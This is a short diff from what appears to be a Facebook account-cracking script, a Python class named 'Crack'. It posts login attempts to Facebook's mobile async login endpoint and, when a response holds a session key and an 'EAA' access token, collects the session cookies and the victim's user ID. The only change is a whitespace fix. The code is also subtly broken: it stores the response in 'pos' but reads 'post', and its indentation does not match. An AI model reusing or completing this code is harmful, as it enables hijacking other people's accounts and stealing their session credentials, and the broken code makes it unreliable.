@@ -502,7 +502,7 @@ class Crack:
 				"referer": "https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
 				"accept-encoding": "gzip, deflate",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			pos = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",params=params, headers=headers, allow_redirects=False)
+			pos = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101", params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
